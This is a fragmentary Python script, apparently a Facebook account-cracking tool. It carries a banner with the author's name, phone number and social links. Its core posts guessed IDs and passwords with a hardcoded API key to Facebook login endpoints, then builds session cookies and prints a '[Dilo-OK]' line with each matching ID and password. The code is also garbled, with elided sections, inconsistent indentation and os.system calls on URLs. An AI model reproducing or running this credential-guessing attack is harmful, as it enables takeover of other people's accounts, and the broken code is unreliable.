...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :       Dilo Bhai 
\033[1;37m Whatsapp:   03154619676
\033[1;37m Github  :       Diloking
\033[1;37m Version :      0.1
\033[1;37m Status  :       Free
\033[1;37m------------------------------------------------
\033[1;37m---------------❤️😘Don't Forget ALLAH😘❤️--------------- """
def clear():
    os.system("clear")
    print(logo)    
...
def Dilo():   
    ...
    print(f'[F] Subscribe Youtube Channel ')
    print('')
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('https://chat.whatsapp.com/CNaxV2HTYMmLmnCBFqp0O0')
        pass
    elif select =='F':
        os.system('https://youtube.com/@dilotech')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        Dilo(allkey)
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',}
                q = session.post("https://mbasic.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',}
                q = session.post("https://mbasic.facebook.com/favicon.ico",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Dilob = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Dilob};{ckkk}"
                    print(f"\r{R} [Dilo-OK] {sid} | {ps} {S}")
                    oks.append(sid)
